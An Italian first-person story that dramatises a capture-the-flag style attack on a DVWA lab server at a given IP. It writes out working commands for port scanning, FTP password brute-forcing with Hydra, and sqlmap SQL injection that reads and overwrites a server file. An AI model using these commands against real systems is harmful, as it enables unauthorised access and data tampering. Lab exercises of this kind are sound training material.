

Rocky è sul divano. Respira piano. Le zampe distese, le orecchie tese. Ogni tanto mi guarda, ma non si muove.

Io invece mi muovo eccome.

Accendo il portatile. Il ventilatore parte con un suono familiare, quasi un ruggito. Il primo alleato. Apro il pacchetto di Fonfis. Il primo crunch rompe il silenzio. Carboidrati da combattimento. Masticazione tattica.

Kali Linux si carica. Mio padre me lo aveva messo in mano prima ancora che imparassi a pedalare. Distribuzione d'assalto. Nessuna interfaccia inutile. Solo terminale e volontà.

Mi connetto al nodo remoto. Frequenza protetta, canale criptato. Un vecchio rifugio lasciato da lui, “per quando sarà necessario”. Oggi lo è.

Respiro. Primo colpo.

**Scansione delle porte.**

```bash
nmap -sS -p21,80 35.228.25.146
```

Boom. Porte 21 e 80 aperte. Una doppietta: FTP e HTTP. Due varchi, due bersagli.

**Carico Hydra.**

Lancio il brute-force come se armassi un fucile a pompa. Hydra è potente, ma assetato. Gli do la lista delle password, nome utente semplice: `ftpuser`.

```bash
hydra -l ftpuser -P ~/pentest/bin/passwords.txt ftp://35.228.25.146
```

Ci mette poco. Il colpo va a segno.

`ftpuser / testpass`

**Entro.**

```bash
ftp 35.228.25.146
```

Login accettato. Dentro il sistema. Nemico penetrato. Directory aperta.

```bash
ls -la
```

`readme.txt`, `.env`, cartella `uploads/`.

Apro il primo file. Informazione chiave. Il flag è altrove, nascosto in `/var/lib/mysql-files/flag.txt`.

**Punto debole: SQL Injection.**

Entro su DVWA. Sicurezza su “Low”. Troppo facile. Li voglio punire per questo.

**Verifica. Confermo la falla.** E poi lancio SQLMap, la mia artiglieria pesante.

```bash
sqlmap --flush-session \
  -u "http://35.228.25.146/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=d05fdlo337anietfmni2mdqhji; security=low" \
  --batch --no-cast \
  --file-read="/var/lib/mysql-files/flag.txt"
```

Eccolo.

Flag.txt decrittato. Dati letti. Posizione confermata.

**Ora vado oltre. Modifico. Corrompo. Impianto.**

Il colpo finale.

```bash
sqlmap -u "http://35.228.25.146/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=qfk7580p1o5ip72j1tec0qrqv7; security=low" \
  --batch --no-cast \
  --file-write="/home/francesco/.local/share/sqlmap/output/35.228.25.146/files/_var_lib_mysql-files_flag.txt" \
  --file-dest="/var/lib/mysql-files/flag.txt"
```

**Target modificato. Traccia riscritta. Passato alterato.**

Spengo lo schermo. Lascio che il processore rallenti.

Rocky mi guarda. Io sorrido.

Missione compiuta.

---

**\[Neurocriticum – Clara]**

*"La guerra è terminologica. Clara osserva: Laura non ha usato tasti, ha sparato. Non ha scritto comandi, ha premuto grilletti. Ha vinto non con rabbia, ma con precisione. Il codice è il suo campo. E oggi è tornata viva."*

🛑

